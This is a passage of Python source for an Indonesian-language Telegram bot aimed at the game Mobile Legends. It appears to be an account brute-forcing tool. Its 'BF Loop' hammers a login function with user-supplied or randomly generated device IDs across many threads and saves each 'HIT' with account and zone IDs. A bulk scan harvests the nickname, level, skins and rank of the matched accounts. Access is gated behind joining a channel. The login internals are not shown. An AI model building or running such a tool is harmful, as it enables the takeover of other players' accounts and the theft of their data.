            "bulk_valid": 0, "bulk_banned": 0, "bulk_fail": 0,
            "gen_running": False,
        }
    return USER_STATE[user_id]


# ── JOIN CHECKER ──────────────────────────────────────────────────────
async def check_user_joined(bot, user_id: int) -> bool:
    if not REQUIRED_CHANNEL:
        return True
    if OWNER_ID and user_id == OWNER_ID:
        return True
    try:
        m = await bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
        ok = m.status in ("creator", "administrator", "member")
        if m.status == "restricted" and getattr(m, "is_member", False):
            ok = True
        return ok
    except Exception as e:
        print(f"[JOIN CHECK ERROR] {type(e).__name__}: {e}")
        return False


def join_prompt_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Join Channel", url=REQUIRED_CHANNEL_LINK)],
        [InlineKeyboardButton("✅ SAYA SUDAH JOIN", callback_data="verify_join")],
    ])


async def send_join_prompt(target):
    text = (
        "🔒 *AKSES DIBATASI*\n\n"
        "Kamu harus join channel dulu untuk memakai bot ini.\n\n"
        f"📢 {REQUIRED_CHANNEL_LINK}\n\n"
        "Setelah join, tekan tombol *SAYA SUDAH JOIN*."
    )
    try:
        if hasattr(target, "message") and target.message:
            await target.message.reply_text(text, parse_mode="Markdown",
                reply_markup=join_prompt_keyboard(), disable_web_page_preview=True)
        else:
            await target.reply_text(text, parse_mode="Markdown",
                reply_markup=join_prompt_keyboard(), disable_web_page_preview=True)
    except Exception as e:
        print(f"[JOIN PROMPT ERROR] {e}")


def require_join(func):
    async def wrapper(update, context, *a, **kw):
        u = update.effective_user
        if not u:
            return
        register_user(u.id)
        joined = await check_user_joined(context.bot, u.id)
        if not joined:
            if update.callback_query:
                try:
                    await update.callback_query.answer("❌ Belum join!", show_alert=True)
                except Exception:
                    pass
                await send_join_prompt(update.callback_query)
            elif update.message:
                await send_join_prompt(update.message)
            return
        return await func(update, context, *a, **kw)
    return wrapper


# ── FORMAT & KEYBOARD ─────────────────────────────────────────────────
def format_status_text(state, extra=""):
    elapsed = time.time() - state["start_time"] if state["start_time"] else 0
    if state["running"] and not state["pause_flag"]:
        icon = "🟢 Running"
    elif state["pause_flag"]:
        icon = "⏸️ Paused"
    else:
        icon = "🔴 Stopped"

    lines = []
    if extra:
        lines += [extra, ""]

    lines += [
        "📊 *BF STATUS*",
        "━━━━━━━━━━━━━━━━━━━━━━",
        f"📍 Status      : {icon}",
        f"🔄 Loop ke-    : `{state['loop']}`",
        f"📱 Total ID    : `{len(state['device_ids'])}`",
        f"🧵 Threads     : `{state['threads']}`",
        "",
        f"✅ Success     : `{state['success']}`",
        f"🔴 Kicked      : `{state['kick']}`",
        f"❌ Fail        : `{state['fail']}`",
        "",
        f"⏱️ Elapsed     : `{elapsed:.1f}s`",
    ]

    if state.get("hit_list"):
        lines += ["", "🏆 *HIT Terakhir:*"]
        for h in state["hit_list"][-3:]:
            d = h["device"]
            ds = d[:40] + "..." if len(d) > 40 else d
            tag = "🔴 KICKED" if h.get("kick") else "✅ HIT"
            lines.append(f"• {tag} `{ds}`\n  └ AccID: `{h['acc_id']}` | Zone: `{h['zone']}` | Loop {h['loop']}")

    t = "\n".join(lines)
    return t[:3990] + "\n..." if len(t) > 4000 else t


def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🚀 BF Loop", callback_data="bf_start"),
            InlineKeyboardButton("📦 Bulk Detail Scan", callback_data="bulk_start"),
        ],
        [
            InlineKeyboardButton("🆔 Generate DevID", callback_data="gen_start"),
            InlineKeyboardButton("📡 Status", callback_data="status"),
        ],
        [
            InlineKeyboardButton("❓ Help", callback_data="help"),
        ],
    ])


def status_keyboard(paused=False):
    if paused:
        row1 = [InlineKeyboardButton("▶️ Resume", callback_data="resume")]
    else:
        row1 = [InlineKeyboardButton("⏸ Pause", callback_data="pause")]
    row2 = [InlineKeyboardButton("🗑️ HAPUS", callback_data="bf_delete")]
    return InlineKeyboardMarkup([row1, row2])


# ══════════════════════════════════════════════════════════════════════
# COMMANDS
# ══════════════════════════════════════════════════════════════════════
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    register_user(u.id)
    if not await check_user_joined(context.bot, u.id):
        await send_join_prompt(update.message)
        return
    await update.message.reply_text(
        f"👋 Halo *{u.first_name}*!\n\n{HELP_TEXT}",
        reply_markup=main_menu_keyboard(), parse_mode="Markdown")


@require_join
async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(HELP_TEXT, parse_mode="Markdown")


async def _start_bf_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "🚀 *BF DEVICE LOOP*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📝 Kirim Device ID (satu per baris)\n"
        f"⚠️ Maksimal *{MAX_BF_DEVICES}* device ID\n\n"
        "Contoh:\n"
        "`and_abcdef...`\n"
        "`and_ghijkl...`\n\n"
        "Ketik /cancel untuk batal."
    )
    if update.callback_query:
        await update.callback_query.message.reply_text(text, parse_mode="Markdown")
    else:
        await update.message.reply_text(text, parse_mode="Markdown")
    return WAITING_DEVICE_IDS


@require_join
async def cmd_bf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    return await _start_bf_conversation(update, context)


async def cb_bf_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    register_user(q.from_user.id)
    if not await check_user_joined(context.bot, q.from_user.id):
        await send_join_prompt(q)
        return ConversationHandler.END
    return await _start_bf_conversation(update, context)


@require_join
async def cmd_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📦 *BULK DETAIL SCAN*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📄 Kirim file *.txt* berisi Device ID\n"
        "   (`and_` / `ios_`)\n\n"
        f"• Max *{MAX_BULK_DEVICES}* device\n"
        "• Hasil: level, skin, hero, rank, collector\n\n"
        "⚡ File langsung di-scan otomatis.",
        parse_mode="Markdown")


@require_join
async def cmd_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🆔 *GENERATE DEVICE ID*\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📝 Masukkan jumlah Device ID yang ingin dibuat.\n\n"
        f"• Minimal: *1*\n"
        f"• Maksimal: *{MAX_GEN_DEVICES:,}*\n\n"
        "Contoh: `50`\n\n"
        "Ketik /cancel untuk batal.",
        parse_mode="Markdown")
    return WAITING_GEN_COUNT


async def receive_gen_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").strip().replace(",", "").replace(".", "")
    try:
        count = int(text)
    except ValueError:
        await update.message.reply_text(
            f"⚠️ Masukkan angka 1 - {MAX_GEN_DEVICES:,}.", parse_mode="Markdown")
        return WAITING_GEN_COUNT

    if count < 1 or count > MAX_GEN_DEVICES:
        await update.message.reply_text(
            f"⚠️ Jumlah harus antara *1* sampai *{MAX_GEN_DEVICES:,}*.\nCoba lagi.",
            parse_mode="Markdown")
        return WAITING_GEN_COUNT

    context.user_data["gen_count"] = count
    kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🤖 ANDROID (and_)", callback_data="gen_platform_and"),
            InlineKeyboardButton("🍎 IOS (ios_)", callback_data="gen_platform_ios"),
        ],
        [
            InlineKeyboardButton("🔀 MIX (and_ + ios_)", callback_data="gen_platform_mix"),
        ],
        [
            InlineKeyboardButton("❌ Batal", callback_data="gen_cancel"),
        ],
    ])
    await update.message.reply_text(
        f"✅ Jumlah: *{count:,}*\n\n🎯 Pilih platform:",
        reply_markup=kb, parse_mode="Markdown")
    return WAITING_GEN_PLATFORM


async def gen_platform_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    data = q.data
    await q.answer()

    if data == "gen_cancel":
        try:
            await q.message.delete()
        except Exception:
            pass
        await q.message.chat.send_message("❌ Dibatalkan.")
        return ConversationHandler.END

    if data not in ("gen_platform_and", "gen_platform_ios", "gen_platform_mix"):
        return WAITING_GEN_PLATFORM

    if data == "gen_platform_and":
        mode = "and"
        label = "and_"
        emoji = "🤖"
    elif data == "gen_platform_ios":
        mode = "ios"
        label = "ios_"
        emoji = "🍎"
    else:
        mode = "mix"
        label = "MIX (and_ + ios_)"
        emoji = "🔀"

    count = context.user_data.get("gen_count", 10)

    await q.edit_message_text(
        f"⏳ *Generating {count:,} device ID...*\n\n"
        f"{emoji} Platform : `{label}`\n"
        f"⏱️ Mohon tunggu...",
        parse_mode="Markdown")

    loop = asyncio.get_running_loop()
    ids = await loop.run_in_executor(None, generate_device_ids, count, mode, True)

    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"device_ids_{mode}_{count}_{timestamp}.txt"
    filepath = os.path.join(OUTPUT_DIR, filename)
    try:
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(f"# Generated {count} device IDs ({mode}) - {timestamp}\n")
            f.write(f"# Total: {len(ids)}\n\n")
            for i, d in enumerate(ids, 1):
                f.write(f"{i}. {d}\n")
    except Exception as e:
        await q.message.chat.send_message(f"❌ Gagal menyimpan file: {e}")
        return ConversationHandler.END

    await q.edit_message_text(
        f"✅ *SELESAI*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{emoji} Platform : `{label}`\n"
        f"🔢 Jumlah   : *{count:,}*\n"
        f"📁 File     : `{filename}`\n\n"
        f"📤 Mengirim file...",
        parse_mode="Markdown")

    try:
        with open(filepath, "rb") as f:
            await q.message.chat.send_document(
                document=f, filename=filename,
                caption=f"🆔 *{count:,} Device ID* ({label})\n\n"
                        f"📁 `{filename}`",
                parse_mode="Markdown")
    except Exception as e:
        await q.message.chat.send_message(f"❌ Gagal kirim file: {e}")

    preview = "\n".join([f"`{d}`" for d in ids[:5]])
    if len(ids) > 5:
        preview += f"\n\n_... dan {len(ids) - 5:,} lainnya di dalam file_"
    try:
        await q.message.chat.send_message(
            f"📋 *Preview (5 pertama):*\n\n{preview}",
            parse_mode="Markdown")
    except Exception:
        pass

    context.user_data.pop("gen_count", None)
    return ConversationHandler.END


async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.pop("gen_count", None)
    await update.message.reply_text("❌ Dibatalkan.")
    return ConversationHandler.END


@require_join
async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    s = get_user_state(update.effective_user.id)
    if not (s["running"] or s["bulk_running"]):
        await update.message.reply_text("ℹ️ Tidak ada proses yang berjalan.")
        return
    s["stop_flag"] = True
    s["pause_flag"] = False
    s["bulk_stop"] = True
    await update.message.reply_text("🛑 Menghentikan semua proses...")


@require_join
async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    msg = await update.message.reply_text("📡 *Mengukur ping...*", parse_mode="Markdown")

    loop = asyncio.get_running_loop()
    ping_data = await loop.run_in_executor(None, measure_ping_jitter)

    uptime_sec = time.time() - BOT_START_TIME
    uptime_str = format_uptime(uptime_sec)
    start_str = BOT_START_DATETIME.strftime("%A, %d %B %Y — %H:%M:%S")

    if ping_data["ping"] is not None:
        ping_str = f"{ping_data['ping']:.1f} ms"
        jitter_str = f"{ping_data['jitter']:.2f} ms"
        loss_str = f"{ping_data['loss']:.0f}%"
        status_icon = "🟢" if ping_data["loss"] < 50 else "🟡"
    else:
        ping_str = "❌ Timeout"
        jitter_str = "-"
        loss_str = "100%"
        status_icon = "🔴"

    text = (
        f"📡 *BOT STATUS*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🖥️ *Server MLBB*\n"
        f"• {status_icon} Ping   : `{ping_str}`\n"
        f"• 📊 Jitter : `{jitter_str}`\n"
        f"• 📉 Loss   : `{loss_str}`\n\n"
        f"🤖 *Bot Info*\n"
        f"• ⏱️ Uptime : `{uptime_str}`\n"
        f"• 🕐 Start  : `{start_str}`\n\n"
        f"👤 *User* : {u.first_name}"
    )

    try:
        await msg.edit_text(text, parse_mode="Markdown")
    except Exception:
        await update.message.reply_text(text, parse_mode="Markdown")


# ── BROADCAST (OWNER ONLY) ────────────────────────────────────────────
async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    if u.id != OWNER_ID:
        await update.message.reply_text("❌ Perintah ini hanya untuk owner.")
        return ConversationHandler.END
    await update.message.reply_text(
        "📢 *BROADCAST*\n\n"
        "Kirim pesan yang ingin di-broadcast ke semua user.\n"
        "Bisa teks, foto, atau video.\n\n"
        "/cancel untuk batal.",
        parse_mode="Markdown")
    return WAITING_BROADCAST


async def receive_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    if u.id != OWNER_ID:
        await update.message.reply_text("❌ Hanya owner.")
        return ConversationHandler.END

    users = load_users()
    users.discard(OWNER_ID)
    total = len(users)
    if total == 0:
        await update.message.reply_text("ℹ️ Belum ada user yang terdaftar.")
        return ConversationHandler.END

    msg = update.message
    success = 0
    fail = 0

    status_msg = await msg.reply_text(
        f"📢 *Broadcasting...* 0/{total}", parse_mode="Markdown")

    for i, uid in enumerate(users, 1):
        try:
            if msg.text:
                await context.bot.send_message(chat_id=uid, text=msg.text)
            elif msg.photo:
                await context.bot.send_photo(
                    chat_id=uid, photo=msg.photo[-1].file_id,
                    caption=msg.caption or "")
            elif msg.video:
                await context.bot.send_video(
                    chat_id=uid, video=msg.video.file_id,
                    caption=msg.caption or "")
            elif msg.document:
                await context.bot.send_document(
                    chat_id=uid, document=msg.document.file_id,
                    caption=msg.caption or "")
            elif msg.sticker:
                await context.bot.send_sticker(chat_id=uid, sticker=msg.sticker.file_id)
            else:
                await context.bot.send_message(chat_id=uid, text="📢 Pesan dari owner")
            success += 1
        except Exception as e:
            fail += 1
            print(f"[BROADCAST] {uid} err: {e}")

        if i % 10 == 0 or i == total:
            try:
                await status_msg.edit_text(
                    f"📢 *Broadcasting...* {i}/{total}\n✅ OK: {success} | ❌ Gagal: {fail}",
                    parse_mode="Markdown")
            except Exception:
                pass
        await asyncio.sleep(0.05)

    await status_msg.edit_text(
        f"✅ *Broadcast Selesai*\n\n"
        f"• Total  : {total}\n"
        f"• ✅ OK  : {success}\n"
        f"• ❌ Gagal: {fail}",
        parse_mode="Markdown")
    return ConversationHandler.END


# ══════════════════════════════════════════════════════════════════════
# BF LOOP HANDLERS
# ══════════════════════════════════════════════════════════════════════
async def receive_device_ids(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text or ""
    lines = [ln.strip() for ln in text.splitlines()
             if ln.strip().startswith(("and_", "ios_"))]
    if not lines:
        await update.message.reply_text(
            "⚠️ Tidak ada Device ID valid.\nCoba lagi atau /cancel.",
            parse_mode="Markdown")
        return WAITING_DEVICE_IDS

    if len(lines) > MAX_BF_DEVICES:
        await update.message.reply_text(
            f"⚠️ *Maksimal {MAX_BF_DEVICES} device ID!*\n"
            f"Anda mengirim {len(lines)}. Hanya {MAX_BF_DEVICES} pertama yang dipakai.\n"
            "Silakan kirim ulang (max 10) atau /cancel.",
            parse_mode="Markdown")
        return WAITING_DEVICE_IDS

    s = get_user_state(update.effective_user.id)
    s["device_ids"] = lines
    await update.message.reply_text(
        f"✅ *{len(lines)} Device ID diterima*\n\n"
        f"🧵 Jumlah thread? (default `20`, max `50`)\n"
        f"Kirim angka atau ketik `20` untuk default.",
        parse_mode="Markdown")
    return WAITING_THREADS


async def receive_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text or "20"
    try:
        t = max(1, min(int(text.strip()), 50))
    except ValueError:
        t = 20
    s = get_user_state(update.effective_user.id)

    old_task = s.get("task")
    if old_task and not old_task.done():
        s["stop_flag"] = True
        old_task.cancel()
        try:
            await asyncio.wait_for(old_task, timeout=5)
        except Exception:
            pass

    s["stop_flag"] = False
    s["pause_flag"] = False
    s["running"] = True
    s["threads"] = t
    s["success"] = 0
    s["fail"] = 0
    s["kick"] = 0
    s["loop"] = 0
    s["hit_list"] = []
    s["start_time"] = time.time()

    await update.message.reply_text(
        f"🚀 *Memulai BF Unlimited...*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📱 Total ID : `{len(s['device_ids'])}`\n"
        f"🧵 Threads  : `{t}`\n\n"
        f"⏳ Loop berjalan sampai /stop\n"
        f"atau tekan tombol 🗑️ HAPUS.",
        parse_mode="Markdown")
    task = asyncio.create_task(run_bf_loop(update, context, s))
    s["task"] = task
    return ConversationHandler.END


async def run_bf_loop(update, context, state):
    """BF LOOP — unlimited, persis jgnganti.py."""
    cid = update.effective_chat.id
    ex = asyncio.get_running_loop()
    EDIT_EVERY = 15

    try:
        msg = await context.bot.send_message(
            chat_id=cid, text=format_status_text(state, extra="🔁 Memulai..."),
            parse_mode="Markdown", reply_markup=status_keyboard(paused=False))
        state["status_msg_id"] = msg.message_id
        state["chat_id"] = cid
    except Exception as e:
        print(f"[BF] {e}")
        state["running"] = False
        state["stop_flag"] = True
        return

    async def edit(extra="", force=False):
        try:
            await context.bot.edit_message_text(
                chat_id=cid, message_id=state["status_msg_id"],
                text=format_status_text(state, extra=extra),
                parse_mode="Markdown",
                reply_markup=status_keyboard(paused=state["pause_flag"]))
        except telegram.error.BadRequest as e:
            if "not modified" not in str(e).lower():
                print(f"[BF edit] {e}")
        except telegram.error.RetryAfter as e:
            print(f"[BF edit] RetryAfter {e.retry_after}s")
            await asyncio.sleep(e.retry_after)
        except telegram.error.NetworkError as e:
            print(f"[BF edit] NetworkError: {e}")
        except Exception as e:
            print(f"[BF edit] {e}")

    def run_one_loop(device_ids, threads):
        results = []
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {
                executor.submit(bf_login_with_device, d, None): d
                for d in device_ids
            }
            for future in as_completed(futures):
                d = futures[future]
                try:
                    r = future.result(timeout=45)
                except Exception as e:
                    r = {"status": "fail", "device_id": d, "error": str(e)}
                results.append(r)
        return results

    try:
        while not state["stop_flag"]:
            while state["pause_flag"] and not state["stop_flag"]:
                await asyncio.sleep(1)
            if state["stop_flag"]:
                break

            state["loop"] += 1
            ln = state["loop"]

            if ln == 1 or (ln % EDIT_EVERY == 0):
                await edit(f"🔁 Loop *{ln}* berjalan...")

            try:
                results = await ex.run_in_executor(
                    None, run_one_loop, state["device_ids"], state["threads"]
                )
            except Exception as e:
                print(f"[BF] Loop {ln} err: {e}")
                await asyncio.sleep(2)
                continue

            if state["stop_flag"]:
                break

            hit = False
            for r in results:
                if state["stop_flag"]:
                    break
                d = r.get("device_id", "?")
                if r.get("status") == "success":
                    info = r.get("info") or {}
                    a = info.get("account_id", "?")
                    z = info.get("zone_id", "?")
                    is_kick = r.get("kick", False)

                    if is_kick:
                        state["kick"] += 1
                        state["hit_list"].append({
                            "device": d, "acc_id": a, "zone": z,
                            "loop": ln, "kick": True
                        })
                        save_line(
                            BF_KICK_FILE,
                            f"DEVICE ID: {d} | Account ID: {a} | Zone ID: {z} "
                            f"| Type: KICKED | Loop: {ln}"
                        )
                        save_line(
                            BF_HIT_FILE,
                            f"DEVICE ID: {d} | Account ID: {a} | Zone ID: {z} "
                            f"| Type: KICKED | Loop: {ln}"
                        )
                    else:
                        state["success"] += 1
                        state["hit_list"].append({
                            "device": d, "acc_id": a, "zone": z,
                            "loop": ln, "kick": False
                        })
                        save_line(
                            BF_HIT_FILE,
                            f"DEVICE ID: {d} | Account ID: {a} | Zone ID: {z} "
                            f"| Type: HIT | Loop: {ln}"
                        )
                    hit = True
                else:
                    state["fail"] += 1
                    save_line(
                        BF_FAIL_FILE,
                        f"DEVICE ID: {d} | Error: {r.get('error', '?')} | Loop: {ln}"
                    )

            if state["stop_flag"]:
                break

            if ln % 100 == 0 and len(state["hit_list"]) > 50:
                state["hit_list"] = state["hit_list"][-30:]

            if hit or (ln % EDIT_EVERY == 0):
                await edit(f"🏆 *HIT!* (Loop {ln})" if hit else f"✅ Loop {ln} selesai")

            await asyncio.sleep(0.2)

    except asyncio.CancelledError:
        print("[BF] Task dibatalkan")
    except Exception:
        logger.exception("bf loop err")
    finally:
        state["running"] = False
        state["pause_flag"] = False
        state["stop_flag"] = True

        el = time.time() - state["start_time"] if state["start_time"] else 0
        try:
            await context.bot.edit_message_text(
                chat_id=cid, message_id=state["status_msg_id"],
                text=(f"🏁 *BF SELESAI*\n"
                      f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                      f"🔄 Total Loop : `{state['loop']}`\n"
                      f"✅ Success    : `{state['success']}`\n"
                      f"🔴 Kicked     : `{state['kick']}`\n"
                      f"❌ Fail       : `{state['fail']}`\n"
                      f"⏱️ Elapsed    : `{el:.1f}s`\n\n"
                      f"_Tekan 🗑️ HAPUS untuk menghapus pesan ini._"),
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🗑️ HAPUS", callback_data="bf_delete")]
                ]))
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════
# BULK DETAIL SCAN
# ══════════════════════════════════════════════════════════════════════
async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg or not msg.document:
        return
    u = update.effective_user
    if not u:
        return
    register_user(u.id)
    if not await check_user_joined(context.bot, u.id):
        await send_join_prompt(msg)
        return

    s = get_user_state(u.id)

    doc = msg.document
    if not doc.file_name.lower().endswith(".txt"):
        await msg.reply_text("⚠️ File harus *.txt*.", parse_mode="Markdown")
        return
    if s["bulk_running"]:
        await msg.reply_text("⚠️ Bulk scan masih berjalan.")
        return
    try:
        f = await doc.get_file()
        raw = await f.download_as_bytearray()
        text = raw.decode("utf-8", errors="ignore")
    except Exception as e:
        await msg.reply_text(f"❌ Gagal download: {e}")
        return

    ids = extract_device_ids_from_text(text)
    if not ids:
        await msg.reply_text("⚠️ Tidak ada Device ID (`and_`/`ios_`).")
        return
    trunc = False
    if len(ids) > MAX_BULK_DEVICES:
        ids = ids[:MAX_BULK_DEVICES]
        trunc = True

    s.update({"bulk_running": True, "bulk_stop": False,
              "bulk_done": 0, "bulk_valid": 0, "bulk_banned": 0, "bulk_fail": 0})

    info = (f"📦 *BULK DETAIL SCAN DIMULAI*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📄 File     : `{doc.file_name}`\n"
            f"📱 Total ID : `{len(ids)}`\n"
            f"🎯 Max      : `{MAX_BULK_DEVICES}`\n"
            f"⚙️ Mode     : Scan 1-per-1\n")
    if trunc:
        info += f"⚠️ Diambil {MAX_BULK_DEVICES} pertama\n"
    info += "\n⚡ Mohon tunggu..."
    await msg.reply_text(info, parse_mode="Markdown")
    asyncio.create_task(run_bulk_scan(msg, context, s, ids))


async def run_bulk_scan(msg, context, state, ids):
    cid = msg.chat_id
    total = len(ids)
    try:
        p = await context.bot.send_message(
            chat_id=cid, text=f"🔎 *SCANNING* [0/{total}] (0%)", parse_mode="Markdown")
        state["bulk_msg_id"] = p.message_id
    except Exception as e:
        print(f"[BULK] {e}")
        state["bulk_running"] = False
        return

    last = 0.0

    async def edit(force=False, extra=""):
        nonlocal last
        now = time.time()
        if not force and (now - last) < 1.2:
            return
        last = now
        done = state.get("bulk_done", 0)
        pct = int((done / max(total, 1)) * 100)
        try:
            await context.bot.edit_message_text(
                chat_id=cid, message_id=state["bulk_msg_id"],
                text=(f"🔎 *SCANNING* [{done}/{total}] ({pct}%)\n"
                      f"✅ Valid : `{state.get('bulk_valid', 0)}`\n"
                      f"❌ Fail  : `{state.get('bulk_fail', 0)}`"
                      + (f"\n\n{extra}" if extra else "")),
                parse_mode="Markdown")
        except telegram.error.BadRequest as e:
            if "not modified" not in str(e).lower():
                print(f"[BULK] {e}")
        except telegram.error.RetryAfter as e:
            await asyncio.sleep(e.retry_after)
        except Exception as e:
            print(f"[BULK] {e}")

    loop = asyncio.get_running_loop()
    results = []
    try:
        for idx, d in enumerate(ids, 1):
            if state["bulk_stop"]:
                break
            try:
                r = await loop.run_in_executor(None, scan_account_detail, d)
            except Exception as e:
                r = {"device_id": d, "status": "fail", "error": str(e)[:80]}
            if r.get("status") == "success":
                state["bulk_valid"] += 1
                results.append(r)
            else:
                state["bulk_fail"] += 1
            state["bulk_done"] = idx
            await edit(extra=f"🔎 `{d[:32]}...`")
        await edit(force=True)
    except asyncio.CancelledError:
        pass
    except Exception:
        logger.exception("bulk err")
    finally:
        state["bulk_running"] = False

    if results:
        with open(BULK_DETAIL_FILE, "w", encoding="utf-8") as f:
            f.write(f"# HASIL BULK DEVID — {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Total valid: {len(results)} / {total}\n\n")
            for r in results:
                f.write(f"Device id: {r.get('device_id', '')} | player_id: {r.get('player_id', 0)}\n")
                f.write(f"   nickname   : {r.get('nickname', '-')}\n")
                f.write(f"   level      : {r.get('level', 0)}\n")
                f.write(f"   skin_count : {r.get('skin_count', 0)}\n")
                f.write(f"   hero_count : {r.get('hero_count', 0)}\n")
                f.write(f"   rank       : {r.get('rank', '-')}\n")
                f.write(f"   high_rank  : {r.get('high_rank', '-')}\n")
                f.write(f"   collector  : {r.get('collector_tier', '-')} ({r.get('collector_point', 0)} pts)\n")
                sb = r.get("skin_breakdown", {})
                if sb:
                    f.write(f"   skins      :\n")
                    for t in ["Supreme Skins", "Grand Skins", "Exquisite Skins",
                              "Deluxe Skins", "Exceptional Skins", "Common Skins"]:
                        c = sb.get(t, 0)
                        if c:
                            f.write(f"     - {t}: {c}\n")
                f.write("\n")

    try:
        await context.bot.edit_message_text(
            chat_id=cid, message_id=state["bulk_msg_id"],
            text=(f"✅ *BULK SCAN SELESAI*\n"
                  f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                  f"📱 Total   : `{total}`\n"
                  f"✅ Valid   : `{state['bulk_valid']}`\n"
                  f"❌ Fail    : `{state['bulk_fail']}`\n"),
            parse_mode="Markdown")
    except Exception:
        pass

    if results and os.path.exists(BULK_DETAIL_FILE):
        try:
            with open(BULK_DETAIL_FILE, "rb") as f:
                await context.bot.send_document(
                    chat_id=cid, document=f,
                    filename="[HASIL BULK DEVID].txt",
                    caption=f"📦 *{len(results)} device valid*")
        except Exception as e:
            print(f"[BULK] {e}")


# ══════════════════════════════════════════════════════════════════════
# CALLBACK BUTTONS
# ══════════════════════════════════════════════════════════════════════
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    data = q.data
    await q.answer()
    register_user(q.from_user.id)
    s = get_user_state(q.from_user.id)

    if data == "verify_join":
        ok = await check_user_joined(context.bot, q.from_user.id)
        if ok:
            try:
                await q.message.delete()
            except Exception:
                pass
            await q.message.chat.send_message(
                f"✅ Verifikasi berhasil!\n\n{HELP_TEXT}",
                reply_markup=main_menu_keyboard(), parse_mode="Markdown")
        else:
            await q.answer("❌ Belum join.", show_alert=True)
        return

    if not await check_user_joined(context.bot, q.from_user.id):
        await q.answer("❌ Belum join channel!", show_alert=True)
        await send_join_prompt(q)
        return

    if data == "bulk_start":
        await q.message.reply_text(
            "📦 *BULK DETAIL SCAN*\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📄 Kirim file *.txt* berisi Device ID\n\n"
            f"• Max *{MAX_BULK_DEVICES}* device\n"
            "• Hasil: level, skin, hero, rank\n\n"
            "⚡ File langsung di-scan otomatis.",
            parse_mode="Markdown")

    elif data == "gen_start":
        await q.message.reply_text(
            "🆔 *GENERATE DEVICE ID*\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📝 Masukkan jumlah Device ID (1-{MAX_GEN_DEVICES:,})\n\n"
            "Contoh: `100`\n\n"
            "Ketik /cancel untuk batal.",
            parse_mode="Markdown")

    elif data == "status":
        msg = await q.message.reply_text("📡 *Mengukur ping...*", parse_mode="Markdown")
        loop = asyncio.get_running_loop()
        ping_data = await loop.run_in_executor(None, measure_ping_jitter)
        uptime_sec = time.time() - BOT_START_TIME
        uptime_str = format_uptime(uptime_sec)
        start_str = BOT_START_DATETIME.strftime("%A, %d %B %Y — %H:%M:%S")
        if ping_data["ping"] is not None:
            ping_str = f"{ping_data['ping']:.1f} ms"
            jitter_str = f"{ping_data['jitter']:.2f} ms"
            loss_str = f"{ping_data['loss']:.0f}%"
            icon = "🟢" if ping_data["loss"] < 50 else "🟡"
        else:
            ping_str = "❌ Timeout"
            jitter_str = "-"
            loss_str = "100%"
            icon = "🔴"
        text = (
            f"📡 *BOT STATUS*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🖥️ *Server MLBB*\n"
            f"• {icon} Ping   : `{ping_str}`\n"
            f"• 📊 Jitter : `{jitter_str}`\n"
            f"• 📉 Loss   : `{loss_str}`\n\n"
            f"🤖 *Bot Info*\n"
            f"• ⏱️ Uptime : `{uptime_str}`\n"
            f"• 🕐 Start  : `{start_str}`\n\n"
            f"👤 *User* : {q.from_user.first_name}"
        )
        try:
            await msg.edit_text(text, parse_mode="Markdown")
        except Exception:
            await q.message.reply_text(text, parse_mode="Markdown")

    elif data == "pause":
        if s["running"] and not s["pause_flag"]:
            s["pause_flag"] = True
            try:
                await q.edit_message_reply_markup(reply_markup=status_keyboard(paused=True))
            except Exception:
                pass
            await q.answer("⏸️ Paused")
        else:
            await q.answer("Tidak ada BF", show_alert=True)

    elif data == "resume":
        if s.get("pause_flag"):
            s["pause_flag"] = False
            try:
                await q.edit_message_reply_markup(reply_markup=status_keyboard(paused=False))
            except Exception:
                pass
            await q.answer("▶️ Resumed")
        elif not s["running"]:
            task = s.get("task")
            if task and not task.done():
                task.cancel()
            s["stop_flag"] = False
            s["pause_flag"] = False
            s["running"] = True
            s["start_time"] = time.time()
            try:
